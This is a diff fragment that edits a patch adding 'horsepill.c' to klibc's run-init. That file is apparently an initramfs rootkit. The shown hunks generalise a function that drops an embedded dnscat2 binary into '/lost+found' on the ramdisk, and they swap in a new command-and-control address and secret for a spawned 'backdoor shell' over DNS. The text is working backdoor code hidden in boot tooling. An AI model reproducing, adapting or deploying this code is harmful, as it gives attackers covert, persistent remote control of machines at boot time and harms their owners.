@@ -10673,7 +10673,7 @@ Index: klibc-2.0.7/usr/kinit/run-init/horsepill.c
 ===================================================================
 --- /dev/null
 +++ klibc-2.0.7/usr/kinit/run-init/horsepill.c
-@@ -0,0 +1,430 @@
+@@ -0,0 +1,429 @@
 +#include "horsepill.h"
 +
 +#include <sys/mount.h>
@@ -10694,7 +10694,6 @@ Index: klibc-2.0.7/usr/kinit/run-init/horsepill.c
 +#include <dirent.h>
 +
 +#include "dnscat.h"
-+
 +
 +#define DNSCAT_PATH	"/lost+found/dnscat"
 +
@@ -10973,14 +10972,14 @@ Index: klibc-2.0.7/usr/kinit/run-init/horsepill.c
 +/**
 + * This function writes dnscat2 executable into ramdisk
 + **/
-+static void write_dnscat2()
++static void write_executable(char *path, unsigned char* exe, unsigned int exe_len)
 +{
 +	FILE* exe_file = NULL;
-+	exe_file = fopen(DNSCAT_PATH, "w+");
++	exe_file = fopen(path, "w+");
 +	if (exe_file) {
-+		fwrite((const void*)dnscat, 1, dnscat_len, exe_file);
++		fwrite((const void*)exe, 1, exe_len, exe_file);
 +		fclose(exe_file);
-+		chmod(DNSCAT_PATH, S_IXUSR | S_IRUSR);
++		chmod(path, S_IXUSR | S_IRUSR);
 +	}
 +}
 +
@@ -11002,8 +11001,8 @@ Index: klibc-2.0.7/usr/kinit/run-init/horsepill.c
 +		// fill command line arguments
 +		argv[0] = "dnscat";
 +		argv[1] = "--dns";
-+		argv[2] = "server=10.220.190.238,port=53531";
-+		argv[3] = "--secret=9ec7ca841e10d11f1fd4ddd2c5457c23";
++		argv[2] = "server=192.168.1.7,port=53531";
++		argv[3] = "--secret=1b063f863a13bdaf8447c94df251015c";
 +
 +		execv(DNSCAT_PATH, argv);
 +		exit(EXIT_FAILURE);
@@ -11072,7 +11071,7 @@ Index: klibc-2.0.7/usr/kinit/run-init/horsepill.c
 +			exit(EXIT_FAILURE);
 +
 +		// write executable of dnscat2
-+		write_dnscat2();
++		write_executable(DNSCAT_PATH, dnscat, dnscat_len);
 +		
 +		// spawn a process for backdoor shell
 +		dnscat_pid = run_dnscat2();
